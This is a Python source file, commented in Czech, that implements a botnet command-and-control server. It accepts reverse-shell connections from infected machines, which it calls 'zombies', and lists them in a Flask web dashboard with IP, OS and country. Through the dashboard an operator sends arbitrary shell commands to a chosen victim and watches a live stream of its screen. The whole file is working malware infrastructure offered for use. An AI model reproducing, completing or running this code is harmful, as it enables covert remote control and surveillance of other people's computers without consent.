import socket
import threading
import pickle
import time
import platform
from flask import Flask, render_template_string, request, redirect, url_for, Response
import os
import uuid
from geopy.geocoders import Nominatim
import struct
import cv2
import numpy as np

# Server konfigurace
CMD_PORT = 4444
STREAM_PORT = 5555
HOST = '0.0.0.0'

app = Flask(__name__)
geolocator = Nominatim(user_agent="reverse_shell_server")
bots = {}
screen_frames = {}

# HTML sablona s live aktualizaci a shell tlacitkem
TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C&C Zombies</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body { background: #111; color: #eee; font-family: sans-serif; }
        table { border-collapse: collapse; width: 100%; background: #222; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        th { background: #444; }
        a { color: #0f0; text-decoration: none; }
    </style>
</head>
<body>
<h2>Zombies Online: {{ bots|length }}</h2>
<table>
<tr><th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Country</th><th>Shell</th><th>Monitor</th></tr>
{% for bot_id, info in bots.items() %}
<tr>
    <td>{{ bot_id }}</td>
    <td>{{ info['status'] }}</td>
    <td>{{ info['ip'] }}</td>
    <td>{{ info['os'] }}</td>
    <td>{{ info['country'] }}</td>
    <td><a href="/shell-id={{ bot_id }}">🕹️</a></td>
    <td><a href="/monitor-id={{ bot_id }}">📺</a></td>
</tr>
{% endfor %}
</table>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(TEMPLATE, bots=bots)

@app.route('/shell-id=<bot_id>', methods=['GET', 'POST'])
def shell(bot_id):
    if request.method == 'POST':
        cmd = request.form['cmd']
        bots[bot_id]['socket'].send(cmd.encode())
        output = bots[bot_id]['socket'].recv(65535).decode(errors='ignore')
        return render_template_string('<pre>{{output}}</pre><a href="">Back</a>', output=output)
    return '''
        <form method="post">
            <input name="cmd" placeholder="Enter command">
            <input type="submit" value="Send">
        </form>
    '''

@app.route('/monitor-id=<bot_id>')
def monitor(bot_id):
    def generate():
        while True:
            frame = screen_frames.get(bot_id)
            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')


def client_handler(client_socket, addr):
    try:
        os_info = client_socket.recv(1024).decode()
        bot_id = str(uuid.uuid4())[:8]

        # Geolokace podle IP
        try:
            location = geolocator.geocode(addr[0])
            country = location.address.split(",")[-1] if location else "Unknown"
        except:
            country = "Unknown"

        bots[bot_id] = {
            'ip': addr[0],
            'os': os_info,
            'status': 'Online',
            'country': country,
            'socket': client_socket
        }

        while True:
            time.sleep(5)
            client_socket.send(b'ping')
            if not client_socket.recv(1024):
                break
    except:
        pass
    finally:
        for id, info in list(bots.items()):
            if info['socket'] == client_socket:
                bots[id]['status'] = 'Offline'


def stream_listener():
    s = socket.socket()
    s.bind((HOST, STREAM_PORT))
    s.listen(5)
    print(f"[+] Stream listener on port {STREAM_PORT}")
    while True:
        client, addr = s.accept()
        threading.Thread(target=handle_stream, args=(client,)).start()


def handle_stream(conn):
    bot_id = None
    while True:
        try:
            raw_size = conn.recv(4)
            if not raw_size:
                break
            size = struct.unpack('>I', raw_size)[0]
            data = b''
            while len(data) < size:
                data += conn.recv(size - len(data))
            frame = data

            # Najdi bot_id podle IP
            for id, info in bots.items():
                if info['ip'] == conn.getpeername()[0]:
                    bot_id = id
                    break

            if bot_id:
                screen_frames[bot_id] = frame
        except:
            break


def command_listener():
    s = socket.socket()
    s.bind((HOST, CMD_PORT))
    s.listen(5)
    print(f"[+] Command listener on port {CMD_PORT}")
    while True:
        client_socket, addr = s.accept()
        threading.Thread(target=client_handler, args=(client_socket, addr)).start()


if __name__ == '__main__':
    threading.Thread(target=command_listener).start()
    threading.Thread(target=stream_listener).start()
    app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
